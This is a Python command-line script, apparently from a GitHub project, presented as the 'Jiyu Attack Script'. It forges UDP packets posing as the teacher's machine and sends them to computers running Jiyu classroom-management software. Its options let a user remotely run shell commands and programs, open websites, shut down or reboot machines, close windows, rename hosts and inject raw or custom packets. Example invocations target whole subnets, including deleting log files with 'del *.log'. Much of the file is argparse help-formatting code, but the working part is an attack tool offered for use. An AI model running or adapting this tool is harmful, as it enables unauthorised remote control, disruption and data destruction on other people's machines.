# pylint: disable=all

"""
Jiyu Attack Script

This script implements a Jiyu attack by sending specially crafted UDP packets to a target IP address.
It allows the user to input a message, which is then formatted and packaged into a byte array before being sent.

The script uses Scapy for packet manipulation and sending.
"""

import argparse
import binascii

from typing import Any, Iterable, List, Optional, Sequence, cast

try:
    from sender import broadcast_packet
    from packet import (
        pkg_close_top_window,
        pkg_close_windows,
        pkg_message,
        pkg_shutdown,
        pkg_rename,
        pkg_website,
        pkg_execute,
        pkg_customize,
    )
except ImportError:
    from Jiyu_udp_attack.sender import broadcast_packet
    from Jiyu_udp_attack.packet import (
        pkg_close_top_window,
        pkg_close_windows,
        pkg_message,
        pkg_shutdown,
        pkg_rename,
        pkg_website,
        pkg_execute,
        pkg_customize,
    )


class ModeOptionalAction(argparse.Action):
    """
    Custom action for handling optional arguments in argparse.
    This action allows the user to specify a mode (e.g., --max or --min) for the program execution.
    """

    def __init__(self, option_strings: Sequence[str], dest: str, modes: Sequence[str], **kwargs: Any):
        self.modes = list(modes)

        if any("-" in mode for mode in self.modes):
            raise ValueError("Modes cannot contain '-' characters. Please use a different character.")

        _option_strings = []
        for option in option_strings:
            _option_strings.append(option)

            for mode in self.modes:
                if option.startswith("--"):
                    if option.startswith(f"--{mode}-"):
                        raise ValueError(
                            f"Option '{option}' cannot start with '--{mode}-'. "
                            "Please use a different prefix for modes."
                        )
                    _option_strings.append(f"--{mode}-{option[2:]}")

        return super().__init__(_option_strings, dest, **kwargs)

    def __call__(
        self,
        parser: argparse.ArgumentParser,
        namespace: argparse.Namespace,
        values: Any,
        option_string: Optional[str] = None,
    ):
        if option_string in self.option_strings:
            option_string = cast(str, option_string)
            if option_string.startswith("--"):
                mode = option_string.split("-")[2]
                if mode not in self.modes:
                    mode = None
            else:
                mode = None
            setattr(namespace, self.dest, (mode, values))

    def format_usage(self) -> str:
        return " | ".join(self.option_strings)


class MaxWidthHelpFormatter(argparse.RawTextHelpFormatter):
    """
    *Replace some methods with Python 3.13 versions for better display*

    Custom help formatter that formats the usage and actions in a more readable way.

    It ensures that the usage line does not exceed a specified width.
    """

    def __init__(self, prog: str, indent_increment: int = 2, max_help_position: int = 24, width: int = 80) -> None:
        super().__init__(prog, indent_increment, max_help_position, width)

    def _format_usage(
        self,
        usage: Optional[str],
        actions: Iterable[argparse.Action],
        groups: Iterable[argparse._MutuallyExclusiveGroup],
        prefix: Optional[str],
    ) -> str:
        if prefix is None:
            prefix = "usage: "

        if usage is not None:
            usage = usage % dict(prog=self._prog)
        elif usage is None and not actions:
            usage = "%(prog)s" % dict(prog=self._prog)
        elif usage is None:
            prog = "%(prog)s" % dict(prog=self._prog)

            optionals = []
            positionals = []
            for action in actions:
                if action.option_strings:
                    optionals.append(action)
                else:
                    positionals.append(action)

            format = self._format_actions_usage
            action_usage = format(optionals + positionals, groups)
            usage = " ".join([s for s in [prog, action_usage] if s])

            text_width = self._width - self._current_indent
            if len(prefix) + len(usage) > text_width:
                opt_parts = self._get_actions_usage_parts(optionals, groups)
                pos_parts = self._get_actions_usage_parts(positionals, groups)

                def get_lines(parts, indent, prefix=None):
                    lines = []
                    line = []
                    indent_length = len(indent)
                    if prefix is not None:
                        line_len = len(prefix) - 1
                    else:
                        line_len = indent_length - 1
                    for part in parts:
                        if line_len + 1 + len(part) > text_width and line:
                            lines.append(indent + " ".join(line))
                            line = []
                            line_len = indent_length - 1
                        line.append(part)
                        line_len += len(part) + 1
                    if line:
                        lines.append(indent + " ".join(line))
                    if prefix is not None:
                        lines[0] = lines[0][indent_length:]
                    return lines

                if len(prefix) + len(prog) <= 0.75 * text_width:
                    indent = " " * (len(prefix) + len(prog) + 1)
                    if opt_parts:
                        lines = get_lines([prog] + opt_parts, indent, prefix)
                        lines.extend(get_lines(pos_parts, indent))
                    elif pos_parts:
                        lines = get_lines([prog] + pos_parts, indent, prefix)
                    else:
                        lines = [prog]

                else:
                    indent = " " * len(prefix)
                    parts = opt_parts + pos_parts
                    lines = get_lines(parts, indent)
                    if len(lines) > 1:
                        lines = []
                        lines.extend(get_lines(opt_parts, indent))
                        lines.extend(get_lines(pos_parts, indent))
                    lines = [prog] + lines

                usage = "\n".join(lines)

        return "%s%s\n\n" % (prefix, usage)

    def _format_actions_usage(
        self,
        actions: Iterable[argparse.Action],
        groups: Iterable[argparse._MutuallyExclusiveGroup],
    ) -> str:
        return " ".join(self._get_actions_usage_parts(list(actions), groups))

    def _get_actions_usage_parts(
        self,
        actions: Sequence[argparse.Action],
        groups: Iterable[argparse._MutuallyExclusiveGroup],
    ) -> List[str]:

        group_actions = set()
        inserts = {}
        for group in groups:
            if not group._group_actions:
                raise ValueError(f"empty group {group}")

            if all(action.help is argparse.SUPPRESS for action in group._group_actions):
                continue

            try:
                start = actions.index(group._group_actions[0])
            except ValueError:
                continue
            else:
                end = start + len(group._group_actions)
                if actions[start:end] == group._group_actions:
                    group_actions.update(group._group_actions)
                    inserts[start, end] = group

        parts = []
        for action in actions:
            if action.help is argparse.SUPPRESS:
                part = None
            elif not action.option_strings:
                default = self._get_default_metavar_for_positional(action)
                part = self._format_args(action, default)
                if action in group_actions:
                    if part[0] == "[" and part[-1] == "]":
                        part = part[1:-1]
            else:
                option_string = action.option_strings[0]
                if action.nargs == 0:
                    try:
                        part = action.format_usage()
                    except AttributeError:
                        part = action.option_strings[0]
                else:
                    default = self._get_default_metavar_for_optional(action)
                    args_string = self._format_args(action, default)
                    part = "%s %s" % (option_string, args_string)
                if not action.required and action not in group_actions:
                    part = "[%s]" % part

            parts.append(part)

        inserted_separators_indices = set()
        for start, end in sorted(inserts, reverse=True):
            group = inserts[start, end]
            group_parts = [item for item in parts[start:end] if item is not None]
            group_size = len(group_parts)
            if group.required:
                open, close = "()" if group_size > 1 else ("", "")
            else:
                open, close = "[]"
            group_parts[0] = open + group_parts[0]
            group_parts[-1] = group_parts[-1] + close
            for i, part in enumerate(group_parts[:-1], start=start):
                if i not in inserted_separators_indices:
                    parts[i] = part + " |"
                    inserted_separators_indices.add(i)
            parts[start + group_size - 1] = group_parts[-1]
            for i in range(start + group_size, end):
                parts[i] = None

        return [item for item in parts if item is not None]

    def _format_action_invocation(self, action: argparse.Action) -> str:
        if not action.option_strings:
            default = self._get_default_metavar_for_positional(action)
            return " ".join(self._metavar_formatter(action, default)(1))
        else:
            if action.nargs == 0:
                return ", ".join(action.option_strings)
            else:
                default = self._get_default_metavar_for_optional(action)
                args_string = self._format_args(action, default)
                return ", ".join(action.option_strings) + " " + args_string

    def _format_args(self, action: argparse.Action, default_metavar: str) -> str:
        get_metavar = self._metavar_formatter(action, default_metavar)
        if action.nargs is None:
            result = "%s" % get_metavar(1)
        elif action.nargs == argparse.OPTIONAL:
            result = "[%s]" % get_metavar(1)
        elif action.nargs == argparse.ZERO_OR_MORE:
            metavar = get_metavar(1)
            if len(metavar) == 2:
                result = "[%s [%s ...]]" % metavar
            else:
                result = "[%s ...]" % metavar
        elif action.nargs == argparse.ONE_OR_MORE:
            result = "%s [%s ...]" % get_metavar(2)
        elif action.nargs == argparse.REMAINDER:
            result = "..."
        elif action.nargs == argparse.PARSER:
            result = "%s ..." % get_metavar(1)
        elif action.nargs == argparse.SUPPRESS:
            result = ""
        else:
            action.nargs = cast(int, action.nargs)
            try:
                formats = ["%s" for _ in range(action.nargs)]
            except TypeError:
                raise ValueError("invalid nargs value") from None
            result = " ".join(formats) % get_metavar(action.nargs)
        return result


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Jiyu Attack Script\n \n"
        "Github Repositories: https://github.com/weilycoder/Jiyu_udp_attack/tree/main/ \n",
        epilog="Example usage:\n"
        '    python Jiyu_udp_attack -t 192.168.106.100 -m "Hello World"\n'
        "    python Jiyu_udp_attack -t 192.168.106.104 -w https://www.github.com\n"
        '    python Jiyu_udp_attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log" -i 1000\n'
        "    python Jiyu_udp_attack -t 224.50.50.42 -e calc.exe\n"
        "    python Jiyu_udp_attack -t 224.50.50.42 --maximize-execute notepad.exe\n"
        '    python Jiyu_udp_attack -t 224.50.50.42 -s 60 "System is going to shutdown."\n'
        '    python Jiyu_udp_attack -t 192.168.106.105-120 -r 30 "Rebooting."\n'
        "    python Jiyu_udp_attack -t 192.168.106.255 -cw\n"
        "    python Jiyu_udp_attack -t 192.168.106.100 -ctw\n"
        "    python Jiyu_udp_attack -t 192.168.106.100 -n hacker 1000\n"
        "    python Jiyu_udp_attack -t 192.168.106.100 --hex 444d4f43000001002a020000\n"
        '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{rand16.size_2}"\n'
        '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0.int.little_4}" 1024\n'
        '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0}{1.size_800}" 4d hello\n'
        "    python Jiyu_udp_attack -t 192.168.106.100 --pkg test.txt 1024 hello\n",
        formatter_class=MaxWidthHelpFormatter,
    )
    network_config_group = parser.add_argument_group(
        "Network Configuration", "Specify the network configuration for the attack."
    )
    network_config_group.add_argument(
        "-f",
        "--teacher-ip",
        type=str,
        metavar="<ip>",
        default=None,
        help="Teacher's IP address",
    )
    network_config_group.add_argument(
        "-fp",
        "--teacher-port",
        type=int,
        metavar="<port>",
        default=None,
        help="Teacher's port (default to random port)",
    )
    network_config_group.add_argument(
        "-t",
        "--target",
        type=str,
        metavar="<ip>",
        required=True,
        help="Target IP address",
    )
    network_config_group.add_argument(
        "-tp",
        "--target-port",
        type=int,
        metavar="<port>",
        default=4705,
        help="Port to send packets to (default: 4705)",
    )
    network_config_group.add_argument(
        "-i",
        "--ip-id",
        type=int,
        metavar="<ip_id>",
        default=None,
        help="IP ID for the packet (default: random ID)",
    )

    attack_action_group = parser.add_argument_group(
        "Attack Action", "Specify the action to perform on the target machine. "
    )
    attack_action = attack_action_group.add_mutually_exclusive_group(required=True)
    attack_action.add_argument(
        "-m",
        "--message",
        type=str,
        metavar="<msg>",
        help="Send a message to the target machine",
    )
    attack_action.add_argument(
        "-w",
        "--website",
        type=str,
        metavar="<url>",
        help="Open a website on the target machine",
    )
    attack_action.add_argument(
        "-c",
        "--command",
        type=str,
        metavar="<command>",
        help="Execute a command on the target machine\n(`cmd /D /C <command>`, Windows only)",
    )
    temp = attack_action.add_argument(
        "-e",
        "--execute",
        nargs="+",
        default=None,
        action=ModeOptionalAction,
        modes=("minimize", "maximize"),
        metavar=("<program>", "<args>"),
        help="Execute a program with arguments on the target machine",
    )
    attack_action.add_argument(
        "-s",
        "--shutdown",
        nargs="*",
        default=None,
        metavar=("<timeout>", "<message>"),
        help="Shutdown the target machine,\noptionally with a timeout and message",
    )
    attack_action.add_argument(
        "-r",
        "--reboot",
        nargs="*",
        default=None,
        metavar=("<timeout>", "<message>"),
        help="Reboot the target machine,\noptionally with a timeout and message",
    )
    attack_action.add_argument(
        "-cw",
        "--close-windows",
        nargs="*",
        default=None,
        metavar=("<timeout>", "<message>"),
        help="Close all windows on the target machine",
    )
    attack_action.add_argument(
        "-ctw",
        "--close-top-window",
        action="store_true",
        help="Close the top window on the target machine",
    )
    attack_action.add_argument(
        "-n",
        "--rename",
        nargs=2,
        metavar=("<name>", "<name_id>"),
        help="Rename the target machine",
    )
    attack_action.add_argument(
        "--hex",
        type=str,
        metavar="<hex_data>",
        help="Send raw hex data to the target machine",
    )
    attack_action.add_argument(
        "--pkg",
        nargs="+",
        metavar=("<custom_data>", "<args>"),
        help="Custom packet data to send",
    )

    args = parser.parse_args()
    teacher_ip = args.teacher_ip
    teacher_port = args.teacher_port
    target = args.target
    port = args.target_port

    try:
        if args.message:
            payload = pkg_message(args.message)
        elif args.website:
            payload = pkg_website(args.website)
        elif args.command:
            payload = pkg_execute("cmd.exe", f'/D /C "{args.command}"', "minimize")
        elif args.close_top_window:
            payload = pkg_close_top_window()
        elif args.execute:
            if len(args.execute) != 2:
                parser.error("Invalid execute arguments: expected [program] or [program, args_list]")
            else:
                mode, args_list = args.execute
                args_list = cast(Sequence[str], args_list)
                if len(args_list) == 1:
                    program, args_list = args_list[0], ""
                elif len(args_list) == 2:
                    program, args_list = args_list
                else:
                    parser.error("Invalid execute arguments: expected [program] or [program, args_list]")
            payload = pkg_execute(program, args_list, "normal" if mode is None else mode)
        elif args.shutdown is not None:
            if len(args.shutdown) == 0:
                payload = pkg_shutdown()
            elif len(args.shutdown) == 1:
                payload = pkg_shutdown(timeout=int(args.shutdown[0]))
            elif len(args.shutdown) == 2:
                payload = pkg_shutdown(timeout=int(args.shutdown[0]), message=args.shutdown[1])
            else:
                parser.error("Invalid shutdown arguments: expected [timeout] or [timeout, message]")
        elif args.reboot is not None:
            if len(args.reboot) == 0:
                payload = pkg_shutdown(reboot=True)
            elif len(args.reboot) == 1:
                payload = pkg_shutdown(timeout=int(args.reboot[0]), reboot=True)
            elif len(args.reboot) == 2:
                payload = pkg_shutdown(timeout=int(args.reboot[0]), message=args.reboot[1], reboot=True)
            else:
                parser.error("Invalid reboot arguments: expected [timeout] or [timeout, message]")
        elif args.close_windows is not None:
            if len(args.close_windows) == 0:
                payload = pkg_close_windows()
            elif len(args.close_windows) == 1:
                payload = pkg_close_windows(timeout=int(args.close_windows[0]))
            elif len(args.close_windows) == 2:
                payload = pkg_close_windows(timeout=int(args.close_windows[0]), message=args.close_windows[1])
            else:
                parser.error("Invalid close windows arguments: expected [timeout] or [timeout, message]")
        elif args.rename:
            name, name_id = args.rename
            payload = pkg_rename(name, int(name_id))
        elif args.hex:
            payload = binascii.unhexlify(args.hex.replace(" ", ""))
        elif args.pkg:
            format_str, *user_args = args.pkg
            if not format_str.startswith(":"):
                with open(format_str, "r", encoding="utf-8") as f:
                    format_str = f.read().strip()
            else:
                format_str = format_str[1:]  # Remove leading ':'
            payload = pkg_customize(format_str, *user_args)
        else:
            raise ValueError("Program logic error, please report this issue: No valid action specified.")

        broadcast_packet(teacher_ip, teacher_port, target, port, payload, ip_id=args.ip_id)
        print(f"Packet sent to {target} on port {port} with payload length {len(payload)} bytes")
    except Exception as e:
        parser.error(f"({e.__class__.__name__}) {e}")
